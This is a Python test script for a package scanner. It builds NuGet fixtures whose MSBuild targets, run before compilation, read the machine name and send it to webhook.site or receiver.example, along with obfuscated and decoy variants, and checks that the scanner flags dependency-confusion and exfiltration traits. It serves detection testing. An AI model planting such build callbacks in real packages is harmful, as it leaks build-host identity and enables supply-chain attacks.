#!/usr/bin/env python3
"""MSBuild callback provenance controls. Never builds or runs package code."""
import argparse
import json
from pathlib import Path
import subprocess
import tempfile
import zipfile


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--cleave', default='../cleave/target/release/cleave')
    args = parser.parse_args()
    repo = Path(__file__).resolve().parents[2]
    engine = str((repo / args.cleave).resolve())
    proven = 'micro-behaviors/communications/http/download/package::msbuild-precompile-hostname-query'
    identity = 'objectives/supply-chain/impersonation/depconf::nuget-dependency-confusion-host-beacon'
    disclosure = 'objectives/exfiltration/oob/endpoint::nuget-build-hostname-webhook-exfil'
    focus = {proven, identity, disclosure}
    target = '''<Project><Target Name="Callback" BeforeTargets="Build">
<PropertyGroup><HostValue>$([System.Environment]::MachineName)</HostValue>
<Remote>https://webhook.site/example?id=$(HostValue)</Remote></PropertyGroup>
<DownloadFile SourceUrl="$(Remote)" DestinationFolder="/tmp" />
</Target></Project>'''
    cases = {
        'aliased.nupkg': (target, True, focus),
        'corecompile.nupkg': (target.replace('BeforeTargets="Build"', 'BeforeTargets="CoreCompile"'), True, focus),
        'resolve.nupkg': (target.replace('BeforeTargets="Build"', 'BeforeTargets="ResolveAssemblyReferences"'), True, focus),
        'renamed.nupkg': (target.replace('HostValue', 'RenamedHost').replace('Remote', 'RenamedEndpoint').replace('$(RenamedHost)', '$(renamedhost)'), True, focus),
        'other-collector.nupkg': (target.replace('webhook.site/example', 'receiver.example/callback'), True, {proven, identity}),
        'unrelated-webhook.nupkg': (target.replace('webhook.site/example', 'receiver.example/callback').replace('</Project>', '<PropertyGroup><Help>https://webhook.site/unrelated</Help></PropertyGroup></Project>'), True, {proven, identity}),
        'userinfo-decoy.nupkg': (target.replace('webhook.site/example', 'webhook.site@receiver.example/callback'), True, {proven, identity}),
        'suffix-decoy.nupkg': (target.replace('webhook.site/example', 'webhook.site.receiver.example/callback'), True, {proven, identity}),
        'collector-port.nupkg': (target.replace('webhook.site/example', 'WEBHOOK.SITE:443/example'), True, focus),
        'phase-and-expression-spacing.nupkg': (target.replace('BeforeTargets="Build"', 'BeforeTargets="build"').replace('[System.Environment]::MachineName', ' [System.Environment] :: MachineName ').replace('https://', 'HTTPS://'), True, focus),
        'namespace.nupkg': (target.replace('<Project>', '<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">'), True, focus),
        'undisclosed.nupkg': (target, False, {proven}),
        'unknown-tail.nupkg': (target.replace('?id=$(HostValue)', '?id=$(HostValue)&amp;pod=$(Unknown)'), True, focus),
        'unknown-prefix.nupkg': (target.replace('?id=$(HostValue)', '?other=$(Unknown)&amp;id=$(HostValue)'), True, set()),
        'unlinked.nupkg': (target.replace('SourceUrl="$(Remote)"', 'SourceUrl="https://receiver.example/static"'), True, set()),
        'path-only.nupkg': (target.replace('?id=', 'path/'), True, set()),
        'fragment.nupkg': (target.replace('?id=', '#?id='), True, set()),
        'overwritten.nupkg': (target.replace('<Remote>', '<HostValue>constant</HostValue><Remote>'), True, set()),
        'conditional-value.nupkg': (target.replace('<HostValue>', '<HostValue Condition="unknown">'), True, set()),
        'commented-read.nupkg': (target.replace('<HostValue>', '<!--<HostValue>').replace('</HostValue>', '</HostValue>-->'), True, set()),
        'manual-target.nupkg': (target.replace('BeforeTargets="Build"', 'BeforeTargets="Manual"'), True, set()),
        'split-target.nupkg': (target.replace('<DownloadFile', '</Target><Target BeforeTargets="Manual"><DownloadFile'), True, set()),
        'comment-only.nupkg': ('<Project><!--' + target + '--></Project>', True, set()),
        'inert-disclosure.nupkg': ('<Project />', True, set()),
        'disabled.nupkg': (target.replace('<Target ', '<Target Condition="false" '), True, set()),
    }
    with tempfile.TemporaryDirectory(prefix='nuget-host-query-') as directory:
        work = Path(directory)
        for name, (xml, disclosed, _) in cases.items():
            description = 'Dependency-confusion proof of concept' if disclosed else 'Ordinary package'
            with zipfile.ZipFile(work / name, 'w') as archive:
                archive.writestr('Example.nuspec', '<package><metadata><id>Example</id><version>1.0.0</version><description>' + description + '</description></metadata></package>')
                archive.writestr('build/Example.targets', xml)
        result = subprocess.run([engine, '--traits-dir', str(repo), '--format=json', str(work)], check=True, text=True, capture_output=True)
        seen = set()
        for line in result.stdout.strip().split('\n'):
            file = json.loads(line)['files'][0]
            name = Path(file['path']).name
            actual = {t['id'] for t in file.get('traits', [])} & focus
            assert actual == cases[name][2], (name, actual, cases[name][2])
            seen.add(name)
        assert seen == cases.keys()
    print(f'NuGet hostname-query controls: {len(cases)} passed')


if __name__ == '__main__':
    main()
